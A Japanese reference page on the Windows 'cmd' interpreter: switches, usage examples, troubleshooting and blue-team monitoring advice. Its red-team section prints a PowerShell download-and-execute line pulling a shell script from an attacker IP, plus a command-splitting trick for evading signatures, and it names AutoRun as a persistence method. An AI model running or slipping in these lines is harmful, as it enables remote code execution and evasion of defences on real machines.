# Command - Windows - cmd - Windows コマンド インタープリターの開始

## 概要

`cmd` は Windows の標準的なコマンドライン インタープリター (シェル) を開始します。

現在のセッションから新しい `cmd.exe` インスタンス（子プロセス）を立ち上げることで、環境変数のスコープを限定したり、特定のフラグ（遅延展開の有効化、Unicode 出力など）を適用してコマンドを実行したりすることが可能です。

(出自: `Windows 標準搭載 - cmd.exe`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| `powershell` | .NET ベースのより強力なシェル。オブジェクト指向。 | 複雑な自動化 |
| `pwsh` | PowerShell Core (クロスプラットフォーム版)。 | モダンな環境 |
| `conhost.exe` | `cmd.exe` などのコンソールアプリを表示するためのホストプロセス。 | (内部動作) |

## よく連携されるコマンド

### シナリオ例: コマンド実行後に即座に終了する (自動化・リモート実行)

* **目的**: 別のプログラムやスクリプトから、特定のコマンドを 1 回だけ実行して結果を受け取る。
* **連携コマンド**: `cmd /c`, `psexec`, `ssh`
* **解説**: `/c` スイッチを使用すると、コマンドの実行が完了した瞬間に子プロセスが終了し、呼び出し元に制御が戻ります。
* **コマンド例**:
    ```cmd
    REM リモートや他のスクリプトからシステム情報を取得
    cmd /c "systeminfo | findstr /B /C:\"OS Name\""
    ```

## スイッチ/オプション説明

| スイッチ | 説明 |
| :--- | :--- |
| ⭐ `/c "string"` | 指定された文字列のコマンドを実行し、終了する。 |
| `/k "string"` | 指定された文字列のコマンドを実行するが、終了せずにプロンプトを維持する。 |
| ⭐ `/v:on` | **遅延環境変数の展開**を有効にする。ループ内での変数操作に必須。 |
| ⭐ `/u` | パイプやファイルへの出力を **Unicode (UTF-16LE)** 形式にする。 |
| `/a` | パイプやファイルへの出力を ANSI (Shift-JIS 等) 形式にする。 |
| `/q` | エコー（実行コマンドの表示）をオフにする。 |
| `/d` | レジストリの AutoRun コマンド（cmd起動時に自動実行される設定）を無視する。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: ループ内で動的に変化する変数を正しく処理する。
* **例**:
    ```cmd
    REM /v:on により !var! 形式で変数の最新値を参照可能にする
    cmd /v:on /c "set var=old & set var=new & echo !var!"
    ```

### 2. ブルーチーム視点

* **タスク**: 親プロセスが `httpd.exe` (Webサーバ) や `sqlservr.exe` であるにもかかわらず、子プロセスとして `cmd.exe` が異常に生成されていないか監視する。
* **解説**: これは Web シェルや SQL インジェクションによる OS コマンド実行の典型的な兆候です。

### 3. レッドチーム視点 (実行と難読化)

* **タスク 1: Reverse Shell の起動**
    * **目的**: 標的端末でコマンドを実行させ、攻撃者の待機マシンへ接続を戻す。
    * **コマンド例**:
        ```cmd
        REM 攻撃者のIP(10.0.0.5)へ接続を投げる例 (簡易イメージ)
        cmd /c "powershell -c IEX(New-Object Net.WebClient).DownloadString('[http://10.0.0.5/shell.ps1](http://10.0.0.5/shell.ps1)')"
        ```

* **タスク 2: コマンドの難読化 (Obfuscation)**
    * **目的**: セキュリティ製品のシグネチャ（特定の文字列検知）を回避する。
    * **解説**: `/c` スイッチ内で環境変数やキャレット (`^`) を多用し、実行時にコマンドを組み立てます。
    * **コマンド例**:
        ```cmd
        REM "whoami" を分割して実行
        cmd /c "set a=who& set b=ami& call %a%%b%"
        ```

## エラーメッセージとトラブルシューティング

1.  **'xxx' は、内部コマンドまたは外部コマンド...として認識されていません。**
    * **原因**: 実行しようとしたコマンドのパスが `PATH` 環境変数に含まれていない。
    * **解決策**: フルパスで指定するか、`set PATH` で追加する。

2.  **コマンドラインが長すぎる**
    * **原因**: `cmd` に渡せる文字列には制限（約 8,191 文字）があります。
    * **解決策**: 長い処理はバッチファイルに書き出す。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **コマンド インジェクション (T1059.003):** ユーザーからの入力を適切にサニタイズせずに `cmd /c` に渡すと、`&` や `|` を用いた任意の追加コマンドを実行される恐れがあります。

### LOLBAS (Living Off The Land Binaries and Scripts) における利用例

* **機能**: `Execute`, `Arbitrary Command Execution`
* **特性**: Windows の中核コンポーネントであるため、実行を完全に禁止することは不可能です。攻撃者はこれを「踏み台」として他のスクリプトやバイナリを実行します。
* **参照**: [LOLBAS - cmd.exe](https://lolbas-project.github.io/lolbas/Binaries/Cmd/)

## 注意点・補足

* **引用符のネスト**: `cmd /c` の中でさらに引用符を使う場合は、エスケープや全体を囲む引用符の扱いに注意が必要です。
* **レジストリの影響**: `HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun` にコマンドを記述すると、`cmd` 起動時に毎回実行されます。これは永続化手法（Persistence）としても悪用されます。
